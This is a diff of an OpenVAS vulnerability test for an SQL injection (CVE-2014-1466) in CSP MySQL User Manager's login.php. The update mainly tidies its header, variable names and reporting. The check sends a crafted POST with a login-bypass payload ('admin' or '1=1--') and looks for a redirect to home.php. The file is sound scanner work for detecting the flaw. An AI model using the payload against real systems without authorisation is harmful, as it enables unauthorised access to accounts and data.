@@ -1,43 +1,23 @@
-##############################################################################
-# OpenVAS Vulnerability Test
+# SPDX-FileCopyrightText: 2014 Greenbone AG
+# Some text descriptions might be excerpted from (a) referenced
+# source(s), and are Copyright (C) by the respective right holder(s).
 #
-# CSP MySQL User Manager SQL Injection Vulnerability
-#
-# Authors:
-# Shashi Kiran N <nskiran@secpod.com>
-#
-# Copyright:
-# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
-#
-# This program is free software; you can redistribute it and/or modify
-# it under the terms of the GNU General Public License version 2
-# (or any later version), as published by the Free Software Foundation.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program; if not, write to the Free Software
-# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
-###############################################################################
+# SPDX-License-Identifier: GPL-2.0-only
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804229");
-  script_version("2022-04-14T11:24:11+0000");
+  script_version("2023-06-22T13:00:03+0000");
   script_cve_id("CVE-2014-1466");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"2022-04-14 11:24:11 +0000 (Thu, 14 Apr 2022)");
+  script_tag(name:"last_modification", value:"2023-06-22 13:00:03 +0000 (Thu, 22 Jun 2023)");
   script_tag(name:"creation_date", value:"2014-01-28 11:34:43 +0530 (Tue, 28 Jan 2014)");
-  script_name("CSP MySQL User Manager SQL Injection Vulnerability");
+  script_name("CSP MySQL User Manager 2.3 SQLi Vulnerability");
 
   script_tag(name:"summary", value:"CSP MySQL User Manager is prone to an SQL injection (SQLi) vulnerability.");
 
-  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP POST request and check whether it is
-  able to login.");
+  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");
 
   script_tag(name:"insight", value:"The flaw is due to input passed via the 'username' parameter to 'login.php',
   which is not properly sanitised before being used in a SQL query.");
@@ -45,7 +25,7 @@ if(description)
   script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL queries by
   injecting arbitrary SQL code and gain sensitive information.");
 
-  script_tag(name:"affected", value:"CSP MySQL User Manager 2.3, Other versions may also be affected.");
+  script_tag(name:"affected", value:"CSP MySQL User Manager 2.3. Other versions may also be affected.");
 
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the
   disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
@@ -58,7 +38,7 @@ if(description)
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64731");
   script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/90210");
   script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
+  script_copyright("Copyright (C) 2014 Greenbone AG");
   script_family("Web application abuses");
   script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
   script_require_ports("Services/www", 80);
@@ -74,40 +54,38 @@ include("list_array_func.inc");
 include("misc_func.inc");
 include("host_details.inc");
 
-cspPort = http_get_port(default:80);
-if(!http_can_host_php(port:cspPort)){
+port = http_get_port(default:80);
+if(!http_can_host_php(port:port))
   exit(0);
-}
 
 useragent = http_get_user_agent();
-host = http_host_name(port:cspPort);
+host = http_host_name(port:port);
 
-foreach dir (make_list_unique("/cmum", "/cspmum", "/", http_cgi_dirs(port:cspPort)))
-{
+foreach dir (make_list_unique("/cmum", "/cspmum", "/", http_cgi_dirs(port:port))) {
 
-  if(dir == "/") dir = "";
+  if(dir == "/")
+    dir = "";
 
-  cspRes = http_get_cache(item:dir + "/index.php", port:cspPort);
+  res = http_get_cache(item:dir + "/index.php", port:port);
 
-  if(cspRes && ">:: CSP MySQL User Manager<" >< cspRes)
-  {
+  if(res && ">:: CSP MySQL User Manager<" >< res) {
     url = dir + "/login.php";
     payload = "loginuser=admin%27+or+%27+1%3D1--&loginpass=" + rand_str(length:5);
 
-    cspReq = string("POST ",url," HTTP/1.1\r\n",
+    req = string("POST ", url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "User-Agent: ", useragent, "\r\n",
                  "Referer: http://", host, dir, "/index.php \r\n",
                  "Connection: keep-alive\r\n",
                  "Cookie: PHPSESSID=fb8c63eb59035022c9f853dba0785c4f\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
-                 "Content-Length: ",strlen(payload), "\r\n\r\n",
+                 "Content-Length: ", strlen(payload), "\r\n\r\n",
                  payload);
-    cspRes = http_keepalive_send_recv(port:cspPort, data:cspReq);
+    res = http_keepalive_send_recv(port:port, data:req);
 
-    if(cspRes && cspRes =~ "HTTP/1.. 302 Found" && "Location: home.php" >< cspRes)
-    {
-      security_message(port:cspPort);
+    if(res && res =~ "^HTTP/1\.[01] 302" && "Location: home.php" >< res) {
+      report = http_report_vuln_url(port:port, url:url);
+      security_message(port:port, data:report);
       exit(0);
     }
   }
